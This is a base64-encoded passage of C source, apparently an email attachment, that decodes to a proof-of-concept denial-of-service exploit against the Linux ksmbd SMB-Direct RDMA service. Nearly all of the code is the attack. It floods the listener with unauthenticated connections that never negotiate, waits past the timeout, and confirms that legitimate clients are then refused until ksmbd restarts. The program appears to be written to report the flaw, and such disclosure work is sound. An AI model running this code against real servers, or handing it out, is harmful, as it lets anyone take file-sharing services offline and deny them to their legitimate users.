Y3EsIC5yZWN2X2NxID0gYy0+Y3EsIC5xcF90eXBlID0gSUJWX1FQVF9SQywKCQkuY2FwID0geyAu
bWF4X3NlbmRfd3IgPSA4LCAubWF4X3JlY3Zfd3IgPSA4LCAubWF4X3NlbmRfc2dlID0gMSwgLm1h
eF9yZWN2X3NnZSA9IDEgfSwKCX07CglpZiAocmRtYV9jcmVhdGVfcXAoYy0+aWQsIGMtPnBkLCAm
cWEpKSByZXR1cm4gLTE7CgoJYy0+c2J1ZiA9IGNhbGxvYygxLCBCVUZTWik7IGMtPnJidWYgPSBj
YWxsb2MoMSwgQlVGU1opOwoJYy0+c21yID0gaWJ2X3JlZ19tcihjLT5wZCwgYy0+c2J1ZiwgQlVG
U1osIElCVl9BQ0NFU1NfTE9DQUxfV1JJVEUpOwoJYy0+cm1yID0gaWJ2X3JlZ19tcihjLT5wZCwg
Yy0+cmJ1ZiwgQlVGU1osIElCVl9BQ0NFU1NfTE9DQUxfV1JJVEUpOwoJaWYgKCFjLT5zbXIgfHwg
IWMtPnJtcikgcmV0dXJuIC0xOwoKCS8qIHBvc3Qgb25lIHJlY3Ygc28gYSAoaHlwb3RoZXRpY2Fs
KSBuZWdvdGlhdGUgcmVzcG9uc2UgaGFzIHNvbWV3aGVyZSB0byBsYW5kICovCglzdHJ1Y3QgaWJ2
X3NnZSByc2dlID0geyAuYWRkciA9ICh1aW50cHRyX3QpYy0+cmJ1ZiwgLmxlbmd0aCA9IEJVRlNa
LCAubGtleSA9IGMtPnJtci0+bGtleSB9OwoJc3RydWN0IGlidl9yZWN2X3dyIHJ3ciA9IHsgLndy
X2lkID0gMSwgLnNnX2xpc3QgPSAmcnNnZSwgLm51bV9zZ2UgPSAxIH0sICpyYmFkOwoJaWJ2X3Bv
c3RfcmVjdihjLT5pZC0+cXAsICZyd3IsICZyYmFkKTsKCglzdHJ1Y3QgcmRtYV9jb25uX3BhcmFt
IGNwID0geyAuaW5pdGlhdG9yX2RlcHRoID0gMSwgLnJlc3BvbmRlcl9yZXNvdXJjZXMgPSAxLAoJ
CQkJICAgICAgLnJldHJ5X2NvdW50ID0gNywgLnJucl9yZXRyeV9jb3VudCA9IDcgfTsKCWlmIChy
ZG1hX2Nvbm5lY3QoYy0+aWQsICZjcCkpIHJldHVybiAtMTsKCWlmICh3YWl0X2V2ZW50KGMsIFJE
TUFfQ01fRVZFTlRfRVNUQUJMSVNIRUQpKSByZXR1cm4gLTE7CglyZXR1cm4gMDsKfQoKLy8gQ2xl
YW4gdGVhcmRvd246IGRpc2Nvbm5lY3QgYW5kIHdhaXQgKGJvdW5kZWQpIGZvciB0aGUgQ00gRElT
Q09OTkVDVEVEIGV2ZW50IHNvCi8vIHRoZSBzZXJ2ZXIgdGVhcnMgaXRzIGhhbGYgZG93biBwcm9t
cHRseS4gKFByb3ZlcyB0aGUgbGVhayBpcyBub3QgYSBjbGllbnQtc2lkZQovLyBvciBhYnJ1cHQt
dGVhcmRvd24gYXJ0aWZhY3QuKQpzdGF0aWMgdm9pZCB0ZWFyZG93bihzdHJ1Y3QgY3R4ICpjKQp7
CglpZiAoYy0+aWQpIHsKCQlyZG1hX2Rpc2Nvbm5lY3QoYy0+aWQpOwoJCXN0cnVjdCBwb2xsZmQg
cGZkID0geyAuZmQgPSBjLT5lYy0+ZmQsIC5ldmVudHMgPSBQT0xMSU4gfTsKCQlmb3IgKGludCBp
ID0gMDsgaSA8IDQ7IGkrKykgewoJCQlpZiAocG9sbCgmcGZkLCAxLCAzMDApIDw9IDApIGJyZWFr
OwoJCQlzdHJ1Y3QgcmRtYV9jbV9ldmVudCAqZXY7CgkJCWlmIChyZG1hX2dldF9jbV9ldmVudChj
LT5lYywgJmV2KSkgYnJlYWs7CgkJCWVudW0gcmRtYV9jbV9ldmVudF90eXBlIHQgPSBldi0+ZXZl
bnQ7CgkJCXJkbWFfYWNrX2NtX2V2ZW50KGV2KTsKCQkJaWYgKHQgPT0gUkRNQV9DTV9FVkVOVF9E
SVNDT05ORUNURUQgfHwgdCA9PSBSRE1BX0NNX0VWRU5UX1RJTUVXQUlUX0VYSVQpIGJyZWFrOwoJ
CX0KCX0KCWlmIChjLT5zbXIpIGlidl9kZXJlZ19tcihjLT5zbXIpOwoJaWYgKGMtPnJtcikgaWJ2
X2RlcmVnX21yKGMtPnJtcik7CglpZiAoYy0+aWQgJiYgYy0+aWQtPnFwKSByZG1hX2Rlc3Ryb3lf
cXAoYy0+aWQpOwoJaWYgKGMtPmNxKSBpYnZfZGVzdHJveV9jcShjLT5jcSk7CglpZiAoYy0+cGQp
IGlidl9kZWFsbG9jX3BkKGMtPnBkKTsKCWlmIChjLT5pZCkgcmRtYV9kZXN0cm95X2lkKGMtPmlk
KTsKCWlmIChjLT5lYykgcmRtYV9kZXN0cm95X2V2ZW50X2NoYW5uZWwoYy0+ZWMpOwoJZnJlZShj
LT5zYnVmKTsgZnJlZShjLT5yYnVmKTsKCW1lbXNldChjLCAwLCBzaXplb2YoKmMpKTsKfQoKLy8g
QSBsZWdpdGltYXRlIGNsaWVudDogZXN0YWJsaXNoICsgdmFsaWQgU01CLURpcmVjdCBuZWdvdGlh
dGUuIFJldHVybnMgMCBpZiB0aGUKLy8gc2VydmVyIGdyYW50ZWQgYSBuZWdvdGlhdGUgcmVzcG9u
c2UgKHNlcnZpY2UgYWxpdmUpLCAtMSBvdGhlcndpc2UuCnN0YXRpYyBpbnQgbGVnaXRfbmVnb3Rp
YXRlKGNvbnN0IGNoYXIgKmlwKQp7CglzdHJ1Y3QgY3R4IGMgPSB7MH07CglpZiAoY29ubmVjdF9x
cCgmYywgaXApKSB7CgkJcHJpbnRmKCIgIHZpY3RpbTogY29ubmVjdCBSRUZVU0VEIChSRE1BX0NN
IHJlamVjdCBzdGF0dXMgJWQpXG4iLCBjLnJlamVjdF9zdGF0dXMpOwoJCXRlYXJkb3duKCZjKTsK
CQlyZXR1cm4gLTE7Cgl9CglzdHJ1Y3QgbmVnb3RpYXRlX3JlcSBuciA9IHsKCQkubWluX3ZlcnNp
b24gPSBTTUJESVJFQ1RfVjEsIC5tYXhfdmVyc2lvbiA9IFNNQkRJUkVDVF9WMSwgLmNyZWRpdHNf
cmVxdWVzdGVkID0gMjU1LAoJCS5wcmVmZXJyZWRfc2VuZF9zaXplID0gMTM2NCwgLm1heF9yZWNl
aXZlX3NpemUgPSA4MTkyLCAubWF4X2ZyYWdtZW50ZWRfc2l6ZSA9IDEwMjQqMTAyNCwKCX07Cglt
ZW1jcHkoYy5zYnVmLCAmbnIsIHNpemVvZihucikpOwoJc3RydWN0IGlidl9zZ2Ugc2dlID0geyAu
YWRkciA9ICh1aW50cHRyX3QpYy5zYnVmLCAubGVuZ3RoID0gc2l6ZW9mKG5yKSwgLmxrZXkgPSBj
LnNtci0+bGtleSB9OwoJc3RydWN0IGlidl9zZW5kX3dyIHdyID0geyAud3JfaWQgPSAyLCAuc2df
bGlzdCA9ICZzZ2UsIC5udW1fc2dlID0gMSwKCQkJCSAgLm9wY29kZSA9IElCVl9XUl9TRU5ELCAu
c2VuZF9mbGFncyA9IElCVl9TRU5EX1NJR05BTEVEIH0sICpiYWQ7CglpYnZfcG9zdF9zZW5kKGMu
aWQtPnFwLCAmd3IsICZiYWQpOwoKCXN0cnVjdCBpYnZfd2Mgd2M7CglpbnQgZ290X3Jlc3AgPSAw
OwoJZm9yIChpbnQgaSA9IDA7IGkgPCAzMDAwOyBpKyspIHsKCQlpbnQgbiA9IGlidl9wb2xsX2Nx
KGMuY3EsIDEsICZ3Yyk7CgkJaWYgKG4gPT0gMSAmJiB3Yy5vcGNvZGUgPT0gSUJWX1dDX1JFQ1Yg
JiYgd2MuYnl0ZV9sZW4gPj0gc2l6ZW9mKHN0cnVjdCBuZWdvdGlhdGVfcmVzcCkpIHsKCQkJZ290
X3Jlc3AgPSAxOyBicmVhazsKCQl9CgkJdXNsZWVwKDEwMDApOwoJfQoJaWYgKGdvdF9yZXNwKSBw
cmludGYoIiAgdmljdGltOiBuZWdvdGlhdGUgT0sgKHNlcnZpY2UgYWxpdmUpXG4iKTsKCXRlYXJk
b3duKCZjKTsKCXJldHVybiBnb3RfcmVzcCA/IDAgOiAtMTsKfQoKaW50IG1haW4oaW50IGFyZ2Ms
IGNoYXIgKiphcmd2KQp7CglpZiAoYXJnYyA8IDIpIHsgZnByaW50ZihzdGRlcnIsICJ1c2FnZTog
JXMgPHNlcnZlci1pcD4gW2F0dGVtcHRzXVxuIiwgYXJndlswXSk7IHJldHVybiAxOyB9Cgljb25z
dCBjaGFyICppcCA9IGFyZ3ZbMV07CglpbnQgYXR0ZW1wdHMgPSAoYXJnYyA+IDIpID8gYXRvaShh
cmd2WzJdKSA6IDEyOwoKCXByaW50ZigiWypdIGJhc2VsaW5lOiBkb2VzIGEgbGVnaXRpbWF0ZSBj
bGllbnQgbmVnb3RpYXRlP1xuIik7CglpZiAobGVnaXRfbmVnb3RpYXRlKGlwKSAhPSAwKSB7CgkJ
cHJpbnRmKCJbIV0gYmFzZWxpbmUgbmVnb3RpYXRlIGFscmVhZHkgZmFpbGluZzsgbGlzdGVuZXIg
bm90IGhlYWx0aHkuIEFib3J0LlxuIik7CgkJcmV0dXJuIDI7Cgl9CgoJcHJpbnRmKCJbKl0gb3Bl
bmluZyAlZCBwcmUtbmVnb3RpYXRlIGNvbm5lY3Rpb25zIChlc3RhYmxpc2gsIHRoZW4gZGlzY29u
bmVjdCwgbmV2ZXIgbmVnb3RpYXRlKVxuIiwgYXR0ZW1wdHMpOwoJaW50IGVzdGFibGlzaGVkID0g
MCwgcmVmdXNlZCA9IDA7Cglmb3IgKGludCBpID0gMDsgaSA8IGF0dGVtcHRzOyBpKyspIHsKCQlz
dHJ1Y3QgY3R4IGMgPSB7MH07CgkJaWYgKGNvbm5lY3RfcXAoJmMsIGlwKSA9PSAwKSB7CgkJCWVz
dGFibGlzaGVkKys7CgkJCXByaW50ZigiICAgIGNvbm4gJTJkOiBFU1RBQkxJU0hFRCAoYWRkZWQg
dG8gbGlzdGVuZXIgYmFja2xvZyksIGRpc2Nvbm5lY3Rpbmcgd2l0aG91dCBuZWdvdGlhdGVcbiIs
IGkgKyAxKTsKCQl9IGVsc2UgewoJCQlyZWZ1c2VkKys7CgkJCXByaW50ZigiICAgIGNvbm4gJTJk
OiBSRUZVU0VEIChyZWplY3Qgc3RhdHVzICVkKSAtLSBiYWNrbG9nIGFscmVhZHkgZnVsbFxuIiwg
aSArIDEsIGMucmVqZWN0X3N0YXR1cyk7CgkJfQoJCXRlYXJkb3duKCZjKTsKCX0KCXByaW50Zigi
WypdIHJlc3VsdDogJWQgZXN0YWJsaXNoZWQsICVkIHJlZnVzZWQgZHVyaW5nIHRoZSBmbG9vZFxu
IiwgZXN0YWJsaXNoZWQsIHJlZnVzZWQpOwoKCXByaW50ZigiWypdIHdhaXRpbmcgMTBzICg+IDVz
IG5lZ290aWF0ZV90aW1lb3V0KSB0byBzaG93IHNsb3RzIGFyZSBOT1QgcmVjbGFpbWVkLi4uXG4i
KTsKCXNsZWVwKDEwKTsKCglwcmludGYoIlsqXSBsZWdpdGltYXRlIGNsaWVudCByZXRyeSBhZnRl
ciB0aGUgZmxvb2Q6XG4iKTsKCWlmIChsZWdpdF9uZWdvdGlhdGUoaXApICE9IDApIHsKCQlwcmlu
dGYoIlxuWytdIERvUyBDT05GSVJNRUQ6IGtzbWJkIFNNQi1EaXJlY3QgcmVmdXNlcyBhIGxlZ2l0
aW1hdGUgY2xpZW50IGFmdGVyICVkXG4iCgkJICAgICAgICIgICAgdW5hdXRoZW50aWNhdGVkIHBy
ZS1uZWdvdGlhdGUgY29ubmVjdGlvbnMuIFNsb3RzIG5vdCByZWNsYWltZWQgYWZ0ZXIgMTBzXG4i
CgkJICAgICAgICIgICAgKG5lZ290aWF0ZV90aW1lb3V0IGlzIDVzKS4gU2VydmljZSBzdGF5cyBk
ZWFkIHVudGlsIGtzbWJkIHJlc3RhcnQuXG4iCgkJICAgICAgICIgICAgKHNlcnZlciBkbWVzZzog
XCJrc21iZDogc21iX2RpcmVjdDogQmFja2xvZ1sxMF1bMTBdIGZ1bGwgLi4uXCIpXG4iLCBhdHRl
bXB0cyk7CgkJcmV0dXJuIDA7Cgl9CglwcmludGYoIlxuWy1dIHNlcnZpY2Ugc3RpbGwgYWxpdmU7
IGNvdWxkIG5vdCByZXByb2R1Y2Ugd2l0aCAlZCBhdHRlbXB0cyAodHJ5IG1vcmUpLlxuIiwgYXR0
ZW1wdHMpOwoJcmV0dXJuIDE7Cn0K
--000000000000ce58c2065ce5791b--
